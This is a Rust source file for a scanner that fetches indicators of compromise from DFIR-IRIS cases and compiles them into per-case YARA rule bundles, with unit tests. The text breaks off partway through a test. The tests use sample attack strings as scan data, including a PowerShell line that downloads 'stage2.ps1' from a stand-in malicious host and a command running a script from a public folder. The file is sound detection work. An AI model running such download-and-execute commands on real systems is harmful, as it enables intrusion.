//! DFIR-IRIS: pull a case's IOCs and turn them into one YARA rule bundle per
//! case, named after the case, so a hit in Splunk says which case it is for.
//!
//! Every rule carries `iris_*` metadata (case id/name, IOC id/type/value,
//! TLP, tags) and its `reference` links back to the case. Each rule is
//! compiled on its own before it goes in the bundle, so one odd IOC is
//! reported and left out instead of breaking the whole bundle.

use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};
use std::fs;
use std::net::IpAddr;
use std::path::{Path, PathBuf};

/// API key from the environment, used when no key is saved or typed.
pub const KEY_ENV: &str = "YARAX_IRIS_API_KEY";

/// Shortest text IOC worth searching for: anything shorter matches everywhere.
pub const MIN_TEXT_LEN: usize = 4;

/// IOC types that are rules for other tools, not values found in files.
const SKIP_TYPES: [&str; 7] = ["yara", "sigma", "snort", "zeek", "bro", "stix2-pattern", "kusto-query"];

/// Whole-file hashes YARA-X can compute, with their hex length.
const FILE_HASHES: [(&str, usize); 3] = [("md5", 32), ("sha1", 40), ("sha256", 64)];

/// Hashes of the file YARA-X has no function for.
const OTHER_FILE_HASHES: [&str; 17] = ["sha224", "sha384", "sha512", "sha512/224", "sha512/256", "sha3-224",
    "sha3-256", "sha3-384", "sha3-512", "ssdeep", "tlsh", "vhash", "pehash", "authentihash", "impfuzzy",
    "telfhash", "cdhash"];

/// Fingerprints of connections and certificates, not of anything in a file.
const NETWORK_FINGERPRINTS: [&str; 10] = ["ja3-fingerprint-md5", "jarm-fingerprint", "hassh-md5",
    "hasshserver-md5", "x509-fingerprint-md5", "x509-fingerprint-sha1", "x509-fingerprint-sha256",
    "ssh-fingerprint", "favicon-mmh3", "community-id"];

/// Types that describe something other than bytes in a file.
const NOT_IN_FILES: [&str; 15] = ["pattern-in-memory", "pattern-in-traffic", "filename-pattern", "size-in-bytes",
    "datetime", "boolean", "float", "http-method", "mime-type", "malware-type", "threat-actor", "campaign-name",
    "campaign-id", "vulnerability", "weakness"];

// ---------------------------------------------------------------------------
// Settings (host + API key), saved per user
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct IrisSettings {
    /// e.g. https://iris.example:8443
    pub url: String,
    #[serde(default)]
    pub api_key: String,
    /// Don't verify the TLS certificate (IRIS ships with a self-signed one).
    #[serde(default)]
    pub insecure: bool,
}

/// `%APPDATA%\yarax-scanner` on Windows, `$XDG_CONFIG_HOME/yarax-scanner` or
/// `~/.config/yarax-scanner` elsewhere.
pub fn config_dir() -> Option<PathBuf> {
    let base = if cfg!(windows) {
        std::env::var_os("APPDATA").map(PathBuf::from)
    } else {
        std::env::var_os("XDG_CONFIG_HOME").map(PathBuf::from)
            .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".config")))
    };
    base.map(|b| b.join("yarax-scanner"))
}

pub fn settings_path() -> Option<PathBuf> { config_dir().map(|d| d.join("iris.json")) }

/// Where generated bundles go unless told otherwise.
pub fn default_bundle_dir() -> PathBuf {
    config_dir().unwrap_or_else(|| PathBuf::from(".")).join("iris-rules")
}

/// Saved settings (missing file = empty); `YARAX_IRIS_API_KEY` fills a blank key.
pub fn load_settings() -> IrisSettings {
    let mut s: IrisSettings = settings_path()
        .and_then(|p| fs::read_to_string(p).ok())
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default();
    if s.api_key.trim().is_empty() {
        s.api_key = std::env::var(KEY_ENV).unwrap_or_default();
    }
    s
}

/// Save to `settings_path()`. On Unix the file is created owner-only (0600):
/// it holds the API key.
pub fn save_settings(s: &IrisSettings) -> Result<PathBuf> {
    let p = settings_path().context("no home / APPDATA folder to save settings in")?;
    fs::create_dir_all(p.parent().unwrap())?;
    let mut o = fs::OpenOptions::new();
    o.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
        o.mode(0o600);
        if p.exists() { fs::set_permissions(&p, fs::Permissions::from_mode(0o600))?; }
    }
    use std::io::Write;
    o.open(&p)?.write_all(serde_json::to_string_pretty(s)?.as_bytes())?;
    Ok(p)
}

/// `format` of the files tools/iris_snapshot.py writes.
const SNAPSHOT_FORMAT: &str = "yarax-iris-snapshot/1";

/// Anything that isn't an http(s) URL is a snapshot file, written by
/// tools/iris_snapshot.py on a host that can reach IRIS.
pub fn is_snapshot(url: &str) -> bool {
    let u = url.trim();
    !(u.starts_with("https://") || u.starts_with("http://"))
}

pub fn validate_settings(s: &IrisSettings) -> std::result::Result<(), String> {
    let u = s.url.trim();
    if is_snapshot(u) && Path::new(u).is_file() {
        return Ok(()); // a snapshot needs no API key
    }
    if is_snapshot(u) || u.len() < 10 {
        return Err("IRIS URL must look like https://iris-server:8443, or be a snapshot file from iris_snapshot.py".into());
    }
    if s.api_key.trim().is_empty() {
        return Err(format!("Enter the IRIS API key (IRIS: your user menu > My settings), or set {KEY_ENV}."));
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// API
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
pub struct Case {
    pub id: u64,
    pub name: String,
    /// IRIS state ("Open", ...); "Closed" when it has a close date and no state
    pub state: String,
    pub client: String,
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
pub struct Ioc {
    #[serde(rename = "ioc_id")]
    pub id: u64,
    #[serde(rename = "ioc_value")]
    pub value: String,
    #[serde(rename = "ioc_type", default)]
    pub kind: String,
    #[serde(rename = "ioc_description", default, deserialize_with = "null_to_empty")]
    pub description: String,
    /// comma-separated, as IRIS stores them
    #[serde(rename = "ioc_tags", default, deserialize_with = "null_to_empty")]
    pub tags: String,
    #[serde(rename = "tlp_name", default, deserialize_with = "null_to_empty")]
    pub tlp: String,
}

fn null_to_empty<'de, D: serde::Deserializer<'de>>(d: D) -> std::result::Result<String, D::Error> {
    Ok(Option::<String>::deserialize(d)?.unwrap_or_default())
}

pub struct Client {
    base: String,
    key: String,
    agent: ureq::Agent,
    /// set when reading a snapshot file instead of the live API
    snapshot: Option<serde_json::Value>,
}

impl Client {
    pub fn new(s: &IrisSettings) -> Result<Self> {
        validate_settings(s).map_err(anyhow::Error::msg)?;
        let url = s.url.trim();
        let mut c = Client { base: url.trim_end_matches('/').to_string(), key: s.api_key.trim().to_string(),
                             agent: crate::splunk::http_agent(s.insecure), snapshot: None };
        if is_snapshot(url) {
            let v: serde_json::Value = serde_json::from_str(&fs::read_to_string(url)
                .with_context(|| format!("cannot read {url}"))?).with_context(|| format!("{url} is not JSON"))?;
            if v["format"] != SNAPSHOT_FORMAT { bail!("{url} is not a snapshot from iris_snapshot.py"); }
            c.base = v["iris_url"].as_str().unwrap_or_default().trim_end_matches('/').to_string();
            c.snapshot = Some(v);
        }
        Ok(c)
    }

    /// The IRIS server (for a snapshot: the one it was taken from); rule
    /// `reference` links point here.
    pub fn iris_url(&self) -> &str { &self.base }

    /// When the snapshot was taken; None when talking to IRIS live.
    pub fn snapshot_time(&self) -> Option<&str> { self.snapshot.as_ref()?["fetched_at"].as_str() }

    /// GET an IRIS endpoint and return its `data`.
    fn get(&self, path: &str) -> Result<serde_json::Value> {
        let url = format!("{}{path}", self.base);
        let mut r = self.agent.get(&url).header("Authorization", &format!("Bearer {}", self.key)).call()
            .map_err(|e| anyhow::anyhow!("cannot reach IRIS at {}: {e}{}", self.base,
                if self.base.starts_with("http://") { " (IRIS normally only answers https://)" }
                else if e.to_string().contains("certificate") { " (IRIS ships a self-signed certificate: tick \"don't verify\" / --iris-insecure)" }
                else { "" }))?;
        let code = r.status().as_u16();
        let text = r.body_mut().read_to_string().unwrap_or_default();
        match code {
            401 | 403 => bail!("IRIS refused the API key (HTTP {code})"),
            200 => {}
            _ => bail!("IRIS returned HTTP {code} for {path}"),
        }
        let v: serde_json::Value = serde_json::from_str(&text)
            .map_err(|_| anyhow::anyhow!("{} did not answer like the IRIS API - check the URL", self.base))?;
        if v["status"] != "success" {
            bail!("IRIS error: {}", v["message"].as_str().unwrap_or("unknown"));
        }
        Ok(v["data"].clone())
    }

    /// `/manage/cases/filter` (documented, any logged-in user; paged) rather
    /// than `/manage/cases/list`, which is undocumented and needs the
    /// standard_user permission.
    pub fn cases(&self) -> Result<Vec<Case>> {
        let mut cases = Vec::new();
        if let Some(v) = &self.snapshot {
            cases = parse_cases(&v["cases"]).context("snapshot has no case list")?;
        } else {
            for page in 1..=1000 {
                let data = self.get(&format!("/manage/cases/filter?per_page=100&page={page}"))?;
                cases.extend(parse_cases(&data["cases"]).context("unexpected case list")?);
                if data["next_page"].is_null() { break; }
            }
        }
        cases.sort_by(|a, b| b.id.cmp(&a.id)); // newest first
        Ok(cases)
    }

    pub fn iocs(&self, case_id: u64) -> Result<Vec<Ioc>> {
        let data = match &self.snapshot {
            Some(v) => match &v["iocs"][case_id.to_string().as_str()] {
                serde_json::Value::Null => bail!("case {case_id} has no IOCs in the snapshot (rerun iris_snapshot.py)"),
                d => d.clone(),
            },
            None => self.get(&format!("/case/ioc/list?cid={case_id}"))?,
        };
        let mut iocs: Vec<Ioc> = serde_json::from_value(data["ioc"].clone())
            .context("unexpected IOC list")?;
        iocs.sort_by_key(|i| i.id);
        Ok(iocs)
    }
}

// ---------------------------------------------------------------------------
// IOC -> YARA
// ---------------------------------------------------------------------------

/// What one IOC (or one part of a composite IOC like `filename|md5`) searches for.
#[derive(Debug, Clone, PartialEq)]
pub enum Pattern {
    /// the file's own hash: `hash.<algo>(0, filesize) == "<hex>"`
    FileHash { algo: &'static str, hex: String },
    /// a PE file's import-table hash: `pe.imphash() == "<hex>"`
    Imphash { hex: String },
    /// raw bytes (IRIS `hex` IOCs): `{ 4D 5A 90 00 }`
    Bytes { hex: String },
    /// text in file content, ASCII and UTF-16; `whole` = not inside a longer word/number
    Text { value: String, nocase: bool, whole: bool },
}

impl Pattern {
    pub fn describe(&self) -> String {
        match self {
            Pattern::FileHash { algo, .. } => format!("file {algo}"),
            Pattern::Imphash { .. } => "PE imphash".into(),
            Pattern::Bytes { .. } => "bytes".into(),
            Pattern::Text { whole: true, .. } => "text (whole word)".into(),
            Pattern::Text { .. } => "text".into(),
        }
    }
}

/// How an IOC will be searched for, or why it can't be.
/// One page of `/manage/cases/filter` `cases` (CaseDetailsSchema rows).
fn parse_cases(rows: &serde_json::Value) -> Option<Vec<Case>> {
    let s = |v: &serde_json::Value| v.as_str().unwrap_or("").to_string();
    Some(rows.as_array()?.iter().map(|c| Case {
        id: c["case_id"].as_u64().unwrap_or(0),
        name: s(&c["name"]),
        state: match c["state"]["state_name"].as_str() {
            Some(st) => st.to_string(),
            None if !s(&c["close_date"]).is_empty() => "Closed".into(),
            None => String::new(),
        },
        client: s(&c["client"]["customer_name"]),
    }).collect())
}

pub fn patterns(ioc: &Ioc) -> std::result::Result<Vec<Pattern>, String> {
    let kind = ioc.kind.trim().to_ascii_lowercase();
    let value = ioc.value.trim();
    if SKIP_TYPES.contains(&kind.as_str()) {
        return Err(format!("{kind} IOCs are rules for another tool - add them as rule files instead"));
    }
    // Composite types (filename|md5, ip-dst|port, ...): one part per `|`
    // when the value has as many parts; otherwise the value is one thing
    // (IRIS's domain|ip often holds just an IP). MISP's malware-sample is
    // "filename|md5".
    let kinds: Vec<&str> = if kind == "malware-sample" { vec!["filename", "md5"] } else { kind.split('|').collect() };
    let values: Vec<&str> = value.split('|').map(str::trim).collect();
    let parts: Vec<(&str, &str)> = if kinds.len() > 1 && kinds.len() == values.len() {
        kinds.into_iter().zip(values).collect()
    } else {
        vec![(kind.as_str(), value)]
    };
    // A hash pins the file exactly; its name beside it would only add
    // matches on files that merely mention the name.
    let hashed = parts.len() > 1 && parts.iter().any(|(k, _)| *k == "imphash" || FILE_HASHES.iter().any(|(h, _)| h == k));
    let mut out = vec![];
    let mut why = vec![];
    for (k, v) in parts {
        if hashed && matches!(k, "filename" | "file-path") { continue; }
        match part(k, v) {
            Ok(Some(p)) => out.push(p),
            Ok(None) => {}
            Err(e) => why.push(e),
        }
    }
    if out.is_empty() {
        return Err(if why.is_empty() { "nothing searchable in this IOC".into() } else { why.join("; ") });
    }
    Ok(out)
}

/// One IOC (or one part of a composite), by its IRIS/MISP type: hashes
/// become conditions on the file, everything searchable becomes text.
fn part(kind: &str, v: &str) -> std::result::Result<Option<Pattern>, String> {
    if kind == "port" { return Ok(None); }
    if v.is_empty() { return Err("empty value".into()); }
    if let Some((algo, len)) = FILE_HASHES.iter().find(|(h, _)| *h == kind) {
        return Ok(Some(Pattern::FileHash { algo, hex: hex_digest(v, *len, kind)? }));
    }
    if kind == "imphash" {
        return Ok(Some(Pattern::Imphash { hex: hex_digest(v, 32, kind)? }));
    }
    if OTHER_FILE_HASHES.contains(&kind) {
        return Err(format!("YARA-X can't compute {kind} hashes"));
    }
    if NETWORK_FINGERPRINTS.contains(&kind) {
        return Err(format!("{kind} fingerprints a connection or certificate, not file contents"));
    }
    if NOT_IN_FILES.contains(&kind) {
        return Err(format!("{kind} isn't something to search file contents for"));
    }
    if kind == "hex" {
        let h: String = v.chars().filter(|c| !c.is_whitespace()).collect::<String>().to_ascii_uppercase();
        if h.len() % 2 == 1 || !h.bytes().all(|b| b.is_ascii_hexdigit()) {
            return Err(format!("\"{v}\" is not hex bytes"));
        }
        if h.len() < MIN_TEXT_LEN * 2 {
            return Err(format!("\"{v}\" is too short to search for (under {MIN_TEXT_LEN} bytes)"));
        }
        let spaced = h.as_bytes().chunks(2).map(|p| std::str::from_utf8(p).unwrap()).collect::<Vec<_>>().join(" ");
        return Ok(Some(Pattern::Bytes { hex: spaced }));
    }
    let network = kind.starts_with("ip")
        || ["url", "uri", "link", "domain", "hostname", "email"].iter().any(|n| kind.contains(n));
    let v = if network { refang(v) } else { v.to_string() };
    if v.parse::<IpAddr>().is_ok() {
        return Ok(Some(Pattern::Text { value: v, nocase: false, whole: true }));
    }
    if kind.starts_with("ip-") {
        return Err(format!("\"{v}\" is not a single IP address (ranges can't be searched for)"));
    }
    if v.len() < MIN_TEXT_LEN {
        return Err(format!("\"{v}\" is too short to search for (under {MIN_TEXT_LEN} characters)"));
    }
    let url = kind.contains("url") || kind.contains("uri") || kind == "link" || v.contains("://");
    let whole = !url && (looks_like_domain(&v) || (v.contains('@') && !v.contains(char::is_whitespace)));
    // pattern-in-file is an exact byte pattern; everything else ignores case
    Ok(Some(Pattern::Text { nocase: kind != "pattern-in-file", whole, value: v }))
}

/// `v` as a lowercase hex digest of `len` digits, or why it isn't one.
fn hex_digest(v: &str, len: usize, kind: &str) -> std::result::Result<String, String> {
    if v.len() == len && v.bytes().all(|b| b.is_ascii_hexdigit()) { Ok(v.to_ascii_lowercase()) }
    else { Err(format!("\"{v}\" is not a valid {kind} ({len} hex digits)")) }
}

/// Undo the usual defanging (hxxp, [.], [:], [at], ...) so the value can
/// match what's really in the evidence.
fn refang(v: &str) -> String {
    let mut s = v.to_string();
    for (from, to) in [("[.]", "."), ("(.)", "."), ("{.}", "."), ("[dot]", "."), ("(dot)", "."),
                       ("[:]", ":"), ("[://]", "://"), ("[@]", "@"), ("[at]", "@"), ("(at)", "@")] {
        s = s.replace(from, to);
    }
    let lower = s.to_ascii_lowercase();
    for (from, to) in [("hxxps://", "https://"), ("hxxp://", "http://"), ("fxp://", "ftp://")] {
        if lower.starts_with(from) { s = format!("{to}{}", &s[from.len()..]); }
    }
    s
}

fn looks_like_domain(v: &str) -> bool {
    let labels: Vec<&str> = v.trim_end_matches('.').split('.').collect();
    labels.len() >= 2
        && labels.iter().all(|l| !l.is_empty() && l.len() <= 63
            && l.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-'))
        && labels.last().is_some_and(|t| t.len() >= 2 && t.bytes().all(|b| b.is_ascii_alphabetic()))
}

/// YARA string literal body: printable ASCII as-is, everything else `\xHH`.
fn esc(s: &str) -> String {
    let mut o = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'"' => o.push_str("\\\""),
            b'\\' => o.push_str("\\\\"),
            0x20..=0x7e => o.push(b as char),
            _ => o.push_str(&format!("\\x{b:02x}")),
        }
    }
    o
}

/// Letters, digits and `_` only; runs of anything else become one `_`.
fn ident(s: &str) -> String {
    let mut o = String::new();
    for c in s.chars() {
        if c.is_ascii_alphanumeric() { o.push(c) } else if !o.ends_with('_') { o.push('_') }
    }
    o.trim_matches('_').to_string()
}

/// Case name without IRIS's automatic "#12 - " prefix.
fn bare_case_name(name: &str) -> &str {
    let n = name.trim();
    match n.strip_prefix('#').and_then(|r| r.split_once(" - ")) {
        Some((num, rest)) if num.trim().bytes().all(|b| b.is_ascii_digit()) => rest.trim(),
        _ => n,
    }
}

/// `IRIS_case12_Ransomware_at_ACME.yar`
pub fn bundle_file_name(case: &Case) -> String {
    let name: String = ident(bare_case_name(&case.name)).chars().take(80).collect();
    if name.is_empty() { format!("IRIS_case{}.yar", case.id) } else { format!("IRIS_case{}_{name}.yar", case.id) }
}

/// One rule, or why the IOC was left out.
pub fn ioc_rule(case: &Case, ioc: &Ioc, iris_url: &str) -> std::result::Result<String, String> {
    let pats = patterns(ioc)?;
    let kind_id: String = ident(&ioc.kind).to_ascii_lowercase().chars().take(30).collect();
    let name = format!("IRIS_c{}_ioc{}{}", case.id, ioc.id, if kind_id.is_empty() { String::new() } else { format!("_{kind_id}") });

    let mut tags = vec!["iris".to_string()];
    if !ioc.tlp.trim().is_empty() { tags.push(format!("tlp_{}", ident(&ioc.tlp).to_ascii_lowercase())); }
    for t in ioc.tags.split(',').map(ident).filter(|t| !t.is_empty()) {
        let t = if t.starts_with(|c: char| c.is_ascii_digit()) { format!("t_{t}") } else { t };
        if !tags.contains(&t) { tags.push(t); }
    }

    let desc = if ioc.description.trim().is_empty() {
        format!("IOC from IRIS case {}", case.name.trim())
    } else {
        format!("{} (IRIS case {})", ioc.description.trim(), case.name.trim())
    };
    let how: Vec<String> = pats.iter().map(Pattern::describe).collect();
    let meta = [
        ("description", esc(&desc)),
        ("reference", esc(&format!("{}/case?cid={}", iris_url.trim().trim_end_matches('/'), case.id))),
        ("iris_case_id", case.id.to_string()),
        ("iris_case_name", esc(case.name.trim())),
        ("iris_ioc_id", ioc.id.to_string()),
        ("iris_ioc_type", esc(&ioc.kind)),
        ("iris_ioc_value", esc(&ioc.value)),
        ("iris_ioc_tlp", esc(&ioc.tlp)),
        ("iris_ioc_tags", esc(&ioc.tags)),
        ("iris_match", esc(&how.join(", "))),
    ];

    let mut strings = vec![];
    let mut cond = vec![];
    for p in &pats {
        match p {
            Pattern::Text { value, nocase, whole } => strings.push(format!("        $ioc{} = \"{}\" ascii wide{}{}",
                strings.len(), esc(value), if *nocase { " nocase" } else { "" }, if *whole { " fullword" } else { "" })),
            Pattern::Bytes { hex } => strings.push(format!("        $ioc{} = {{ {hex} }}", strings.len())),
            Pattern::FileHash { algo, hex } => cond.push(format!("hash.{algo}(0, filesize) == \"{hex}\"")),
            Pattern::Imphash { hex } => cond.push(format!("pe.imphash() == \"{hex}\"")),
        }
    }
    if !strings.is_empty() { cond.insert(0, "any of ($ioc*)".into()); }

    let mut r = format!("rule {name} : {}\n{{\n    meta:\n", tags.join(" "));
    for (k, v) in meta {
        if matches!(k, "iris_case_id" | "iris_ioc_id") { r.push_str(&format!("        {k} = {v}\n")); }
        else { r.push_str(&format!("        {k} = \"{v}\"\n")); }
    }
    if !strings.is_empty() { r.push_str(&format!("    strings:\n{}\n", strings.join("\n"))); }
    r.push_str(&format!("    condition:\n        {}\n}}\n", cond.join(" or ")));

    // Last line of defence: anything YARA-X won't compile stays out.
    let mut c = yara_x::Compiler::new();
    c.add_source(format!("{}{r}", imports(&r)).as_str())
        .map_err(|e| format!("does not compile: {}", e.to_string().lines().next().unwrap_or("")))?;
    Ok(r)
}

pub struct Bundle {
    pub file_name: String,
    pub text: String,
    pub rules: usize,
    /// IOCs left out, with the reason
    pub skipped: Vec<(Ioc, String)>,
}

/// `import` lines for the modules `rules` use. `pe` only when needed: an
/// imported module runs on every scanned file.
fn imports(rules: &str) -> String {
    let mut s = "import \"hash\"\n".to_string();
    if rules.contains("pe.imphash(") { s.push_str("import \"pe\"\n"); }
    s
}

/// One bundle for a case from the chosen IOCs.
pub fn build_bundle(case: &Case, iocs: &[Ioc], iris_url: &str) -> Bundle {
    let mut rules = vec![];
    let mut skipped = vec![];
    for i in iocs {
        match ioc_rule(case, i, iris_url) {
            Ok(r) => rules.push(r),
            Err(e) => skipped.push((i.clone(), e)),
        }
    }
    let text = format!(
        "// DFIR-IRIS case {} (id {}) - {} IOC rule(s)\n// Source: {}  Generated: {} by yarax-scanner {}\n\n{}\n{}",
        case.name.trim().replace('\n', " "), case.id, rules.len(), iris_url.trim(),
        crate::utils::now_iso(), crate::config::SCANNER_VERSION, imports(&rules.concat()), rules.join("\n"));
    Bundle { file_name: bundle_file_name(case), text, rules: rules.len(), skipped }
}

/// Write the bundle into `dir` (replacing an older one for the same case).
pub fn write_bundle(dir: &Path, b: &Bundle) -> Result<PathBuf> {
    anyhow::ensure!(b.rules > 0, "no IOC in this case could be turned into a rule");
    fs::create_dir_all(dir).with_context(|| format!("creating {}", dir.display()))?;
    let p = dir.join(&b.file_name);
    fs::write(&p, &b.text).with_context(|| format!("writing {}", p.display()))?;
    Ok(p)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ioc(id: u64, kind: &str, value: &str) -> Ioc {
        Ioc { id, value: value.into(), kind: kind.into(), description: String::new(), tags: String::new(), tlp: "amber".into() }
    }
    fn case() -> Case { Case { id: 2, name: "#2 - WEB01 compromise \"test\"".into(), state: "Open".into(), client: String::new() } }

    #[test]
    fn awkward_iocs_all_compile_in_one_bundle() {
        let mut iocs = vec![
            ioc(1, "ip-dst", "10.0.0.5"),
            ioc(2, "ip-dst|port", "185.220.101.4|443"),
            ioc(3, "domain", "evil-domain.com"),
            ioc(4, "url", r#"http://evil.com/a?b="c""#),
            ioc(5, "md5", "44D88612FEA8A8F36DE82E1278ABB02F"),
            ioc(6, "filename", r"C:\Users\Public\run.ps1"),
            ioc(7, "named pipe", r"\\.\pipe\msagent_12"),
            ioc(8, "filename|sha256", "bad.exe|275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"),
            ioc(9, "domain|ip", "155.186.192.221"),
            ioc(10, "text", "café\tnull\0byte"),
            ioc(11, "yara", "rule x { condition: true }"),
            ioc(12, "text", "ab"),
            ioc(13, "domain", "evil-domain.com"), // the same value twice
            ioc(14, "url", &format!("https://{}.com/x", "a".repeat(300))),
        ];
        iocs[0].description = "multi\nline \"quoted\" \\ desc".into();
        iocs[0].tags = "c2, 2026 apt,  ,c2".into();
        let b = build_bundle(&case(), &iocs, "https://iris:8443/");
        let skipped: Vec<u64> = b.skipped.iter().map(|(i, _)| i.id).collect();
        assert_eq!(skipped, [11, 12], "{:?}", b.skipped);
        assert_eq!(b.rules, 12);
        assert_eq!(b.file_name, "IRIS_case2_WEB01_compromise_test.yar");
        let mut c = yara_x::Compiler::new();
        c.add_source(b.text.as_str()).unwrap();
        let rules = c.build();
        let names: Vec<String> = rules.iter().map(|r| r.identifier().to_string()).collect();
        assert!(names.contains(&"IRIS_c2_ioc1_ip_dst".to_string()));
        let r1 = rules.iter().find(|r| r.identifier() == "IRIS_c2_ioc1_ip_dst").unwrap();
        let tags: Vec<&str> = r1.tags().map(|t| t.identifier()).collect();
        assert_eq!(tags, ["iris", "tlp_amber", "c2", "t_2026_apt"]);
        let meta: Vec<(String, String)> = r1.metadata().map(|(k, v)| (k.to_string(), format!("{v:?}"))).collect();
        assert!(meta.iter().any(|(k, v)| k == "reference" && v.contains("https://iris:8443/case?cid=2")));
    }

    fn hits(rule: &str, data: &[u8]) -> bool {
        let mut c = yara_x::Compiler::new();
        c.add_source(format!("{}{rule}", imports(rule)).as_str()).unwrap();
        let rules = c.build();
        yara_x::Scanner::new(&rules).scan(data).unwrap().matching_rules().len() > 0
    }

    #[test]
    fn rules_match_what_they_should_and_nothing_else() {
        let ip = ioc_rule(&case(), &ioc(1, "ip-dst", "10.0.0.5"), "https://i").unwrap();
        assert!(hits(&ip, b"connect 10.0.0.5:443"));
        assert!(hits(&ip, "c\0o\0n\0 \x001\x000\x00.\x000\x00.\x000\x00.\x005\x00 \0".as_bytes()));
        assert!(!hits(&ip, b"110.0.0.55 and raw \x0a\x00\x00\x05 bytes"));

        let dom = ioc_rule(&case(), &ioc(2, "domain", "evil.com"), "https://i").unwrap();
        assert!(hits(&dom, b"GET http://cdn.EVIL.com/x"));
        assert!(!hits(&dom, b"notevil.com"));

        // a hash IOC matches the file with that hash, not the hash as text
        let md5 = ioc_rule(&case(), &ioc(3, "md5", "5EB63BBBE01EEED093CB22BB8F5ACDC3"), "https://i").unwrap();
        assert!(hits(&md5, b"hello world"));
        assert!(!hits(&md5, b"5eb63bbbe01eeed093cb22bb8f5acdc3"));

        let path = ioc_rule(&case(), &ioc(4, "filename", r"C:\Users\Public\run.ps1"), "https://i").unwrap();
        assert!(hits(&path, br"powershell -f c:\users\public\RUN.PS1"));
    }

    #[test]
    fn ioc_type_decides_how_it_is_searched() {
        let p = |kind: &str, v: &str| patterns(&ioc(1, kind, v));
        let md5 = "5eb63bbbe01eeed093cb22bb8f5acdc3"; // md5("hello world")
        // same 32 hex digits, three different meanings
        assert_eq!(p("md5", md5).unwrap(), [Pattern::FileHash { algo: "md5", hex: md5.into() }]);
        assert_eq!(p("imphash", md5).unwrap(), [Pattern::Imphash { hex: md5.into() }]);
        assert!(p("ja3-fingerprint-md5", md5).unwrap_err().contains("connection or certificate"));
        assert!(matches!(p("text", md5).unwrap()[0], Pattern::Text { .. })); // a note, not a file hash
        assert!(p("x509-fingerprint-sha256", &"a".repeat(64)).is_err());
        assert!(p("sha512", &"a".repeat(128)).unwrap_err().contains("can't compute"));
        assert!(p("ssdeep", "3:AXGBicFlgVNhBGcL6wCrFQEv:AXGHsNhxLsr2C").is_err());
        assert!(p("md5", "5eb63bbbe01eeed093cb22bb8f5acdc").unwrap_err().contains("32 hex digits"));
        assert!(p("pattern-in-traffic", "GET /beacon").is_err());
        assert!(p("ip-dst", "10.0.0.0/24").unwrap_err().contains("not a single IP"));

        // the hash identifies the file; the name beside it is dropped
        let both = format!("invoice.exe|{md5}");
        assert_eq!(p("filename|md5", &both).unwrap(), [Pattern::FileHash { algo: "md5", hex: md5.into() }]);
        assert_eq!(p("malware-sample", &both).unwrap(), [Pattern::FileHash { algo: "md5", hex: md5.into() }]);
        assert!(matches!(p("filename", "invoice.exe").unwrap()[0], Pattern::Text { .. })); // alone it stays text

        assert_eq!(p("hex", "4d5a 9000").unwrap(), [Pattern::Bytes { hex: "4D 5A 90 00".into() }]);
        assert!(p("hex", "4d5a9").is_err());
    }

    #[test]
    fn defanged_values_match_the_real_thing() {
        let r = |kind: &str, v: &str| ioc_rule(&case(), &ioc(1, kind, v), "https://i").unwrap();
        assert!(hits(&r("domain", "evil-update[.]net"), b"resolve evil-update.net"));
        assert!(hits(&r("url", "hxxp://evil-update[.]net/stage2.ps1"), b"iwr http://evil-update.net/stage2.ps1"));
        assert!(hits(&r("ip-dst", "185.220.101[.]4"), b"to 185.220.101.4:443"));
        assert!(hits(&r("email-src", "bad[@]evil[.]com"), b"From: bad@evil.com"));
        // not a network type: brackets are literal, and pattern-in-file keeps case
        let pat = r("pattern-in-file", "Stage(.)One");
        assert!(hits(&pat, b"xStage(.)Onex"));
        assert!(!hits(&pat, b"Stage.One") && !hits(&pat, b"stage(.)one"));
        assert!(hits(&r("hex", "4d5a9000"), b"\x00MZ\x90\x00\x03"));
        // imphash: the rule compiles with pe imported, and plain data is not a PE
        let imp = r("imphash", "f34d5f2d4577ed6d9ceec516c1f5a744");
        assert!(imp.contains("pe.imphash()") && !hits(&imp, b"MZ not really a PE"));
        let b = build_bundle(&case(), &[ioc(1, "imphash", "f34d5f2d4577ed6d9ceec516c1f5a744")], "https://i");
        assert!(b.text.contains("import \"pe\""));
        assert!(!build_bundle(&case(), &[ioc(1, "domain", "evil.com")], "https://i").text.contains("import \"pe\""));
    }

    #[test]
    fn iris_api_shapes_parse() {
        let v = serde_json::json!([{"ioc_id": 9, "ioc_value": "155.186.192.221", "ioc_type": "domain|ip",
            "ioc_description": null, "ioc_tags": null, "tlp_name": "amber", "ioc_type_id": 21}]);
        let iocs: Vec<Ioc> = serde_json::from_value(v).unwrap();
        assert_eq!(iocs[0].kind, "domain|ip");
        assert_eq!(iocs[0].tags, "");
        assert_eq!(patterns(&iocs[0]).unwrap(),
                   [Pattern::Text { value: "155.186.192.221".into(), nocase: false, whole: true }]);
        let rows = serde_json::json!([
            {"case_id": 2, "name": "#2 - WEB01 compromise", "close_date": null,
             "state": {"state_name": "Open"}, "client": {"customer_name": "ACME"}},
            {"case_id": 1, "name": "#1 - Old", "close_date": "2026-06-18", "state": null, "client": null}]);
        assert_eq!(parse_cases(&rows).unwrap(), [
            Case { id: 2, name: "#2 - WEB01 compromise".into(), state: "Open".into(), client: "ACME".into() },
            Case { id: 1, name: "#1 - Old".into(), state: "Closed".into(), client: String::new() }]);
        assert_eq!(bare_case_name("#12 - Ransomware at ACME"), "Ransomware at ACME");
        assert_eq!(bare_case_name("#hashtag - x"), "#hashtag - x");
    }

    #[test]
    fn snapshot_file_stands_in_for_the_api() {
        let p = std::env::temp_dir().join(format!("yarax-iris-snap-{}.json", std::process::id()));
        fs::write(&p, serde_json::json!({
            "format": SNAPSHOT_FORMAT, "iris_url": "https://iris.prod/", "fetched_at": "2026-10-20T15:00:00-05:00",
            "cases": [{"case_id": 17, "name": "#17 - Prod", "close_date": null, "state": {"state_name": "Open"}, "client": null}],
